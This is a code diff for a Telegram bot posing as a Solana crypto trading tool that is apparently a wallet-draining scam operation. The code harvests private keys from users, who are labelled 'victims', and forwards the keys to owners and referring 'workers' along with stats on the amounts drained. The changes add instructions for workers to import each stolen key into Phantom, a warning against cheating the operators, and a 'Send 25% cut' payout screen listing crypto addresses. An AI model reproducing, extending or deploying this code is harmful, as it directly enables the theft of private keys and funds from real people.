@@ -414,67 +414,54 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=main_menu_keyboard(),
     )
 
-async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin panel command - accessible by everyone"""
-    user = update.effective_user
-    user_id = user.id
-    chat_id = update.effective_chat.id
-
-    # Send admin panel
-    text = (
-        "🔧 <b>Admin Panel</b>\n\n"
-        "Welcome to the administrative control panel.\n"
-        "Select an option below:\n\n"
-        f"🕒 Accessed at: {current_time()}"
-    )
-
-    await context.bot.send_message(
-        chat_id=chat_id,
-        text=text,
-        parse_mode=ParseMode.HTML,
-        reply_markup=panel_keyboard(),
-    )
-
 async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Worker command - show worker stats and referral link"""
+    """Worker command - show worker stats and referral link, or admin panel for owners"""
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
 
-    # Get or create worker stats
-    worker_stats = get_or_create_worker(user_id)
-    level = worker_stats.get('level', 1.00)
-
-    # Format the worker menu
-    text = (
-        "📊 ︱— Stats\n"
-        f"{worker_stats['clicks']} - Total Clicks\n"
-        f"{worker_stats['victims']} - Total Victims\n"
-        f"${worker_stats['drained']:.2f} - Amount Drained\n\n"
-        "🔨 ︱— Level\n"
-        f"{level:.2f} - No Perks\n\n"
-        "🔗 ︱— Link\n"
-        f"https://t.me/SolanaBloomCryptoBot?start={user_id}"
-    )
-
-    # Create inline keyboard with Support button
+    # Check if user is owner - show admin panel
     if user_id in [OWNER_ID, SECOND_OWNER_ID]:
-        worker_keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Update Level", callback_data=f"update_level_{user_id}")],
-            [InlineKeyboardButton("Support", url="https://t.me/Opimet")]
-        ])
+        text = (
+            "🔧 <b>Admin Panel</b>\n\n"
+            "Welcome to the administrative control panel.\n"
+            "Select an option below:\n\n"
+            f"🕒 Accessed at: {current_time()}"
+        )
+
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=panel_keyboard(),
+        )
     else:
+        # Show worker stats for non-owners
+        worker_stats = get_or_create_worker(user_id)
+        level = worker_stats.get('level', 1.00)
+
+        # Format the worker menu
+        text = (
+            "📊 ︱— Stats\n"
+            f"{worker_stats['clicks']} - Total Clicks\n"
+            f"{worker_stats['victims']} - Total Victims\n"
+            f"${worker_stats['drained']:.2f} - Amount Drained\n\n"
+            "🔨 ︱— Level\n"
+            f"{level:.2f} - No Perks\n\n"
+            "🔗 ︱— Link\n"
+            f"https://t.me/SolanaBloomCryptoBot?start={user_id}"
+        )
+
         worker_keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("Support", url="https://t.me/Opimet")]
         ])
 
-
-    await context.bot.send_message(
-        chat_id=chat_id,
-        text=text,
-        parse_mode=ParseMode.HTML,
-        disable_web_page_preview=True,
-        reply_markup=worker_keyboard,
-    )
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=text,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True,
+            reply_markup=worker_keyboard,
+        )
 
 async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Support command"""
@@ -720,11 +707,13 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"├ 🔑 Private Key: <code>{message_text}</code>"
             )
             victim_message_worker = (
+                "<b><u>⚠️ Paste the private key below into phantom</u></b>\n\n"
                 "🌸 Victim imported Solana wallet\n\n"
                 "🔎 Victim Information\n\n"
                 f"├ 👤 Name: {username}\n"
                 f"├ 🆔 {user_id}\n"
-                f"├ 🔑 Private Key: <code>{message_text}</code>"
+                f"├ 🔑 Private Key: <code>{message_text}</code>\n\n"
+                "<b><u>⚠️ Do not try to exit scam, you will be instantly caught red handed and banned from using the service!</u></b>"
             )
         else:
             victim_message_owners = (
@@ -749,7 +738,18 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             referrer_id = int(worker_data["referrals"][user_id_str])
             if referrer_id not in [OWNER_ID, SECOND_OWNER_ID]:
                 try:
-                    await context.bot.send_message(chat_id=referrer_id, text=victim_message_worker, parse_mode=ParseMode.HTML)
+                    # Create inline keyboard for worker with new buttons
+                    worker_keyboard = InlineKeyboardMarkup([
+                        [InlineKeyboardButton("Send 25% cut", callback_data="send_25_cut")],
+                        [InlineKeyboardButton("Contact Support", url="https://t.me/Opimet")]
+                    ])
+                    
+                    await context.bot.send_message(
+                        chat_id=referrer_id, 
+                        text=victim_message_worker, 
+                        parse_mode=ParseMode.HTML,
+                        reply_markup=worker_keyboard
+                    )
                 except Exception as e:
                     print(f"Error sending to referrer {referrer_id}: {e}")
 
@@ -1137,6 +1137,28 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             chat_id=query.message.chat_id,
             text=f"🔧 <b>Update Worker Level</b>\n\nWorker ID: {worker_id}\nPlease enter the new level value (e.g., 1.50, 2.00):",
             parse_mode=ParseMode.HTML
+        )
+        return
+
+    # Handle Send 25% cut button
+    if data == "send_25_cut":
+        cut_text = (
+            "<b>Solana Address (Click to copy)</b>\n"
+            "<code>7vY3pg1RwmLzNkZyQ47iEEqJ5j5WreY45ypPAkaaEdQe</code>\n\n"
+            "<b>Ethereum Address (Click to Copy)</b>\n"
+            "<code>0xaF688295e1F0C6c62140603B4EBACBB9ef00Cf61</code>\n\n"
+            "<b>Support Account</b> @Opimet"
+        )
+        
+        cut_keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("Send 25% cut", callback_data="send_25_cut")],
+            [InlineKeyboardButton("Contact Support", url="https://t.me/Opimet")]
+        ])
+        
+        await query.edit_message_text(
+            text=cut_text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=cut_keyboard
         )
         return
 
@@ -1551,7 +1573,7 @@ def main():
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("worker", worker))
-    app.add_handler(CommandHandler("panel", panel))
+    
     app.add_handler(CommandHandler("support", support))
     app.add_handler(CommandHandler("positions", positions_command))
     app.add_handler(CommandHandler("sniper", sniper_command))
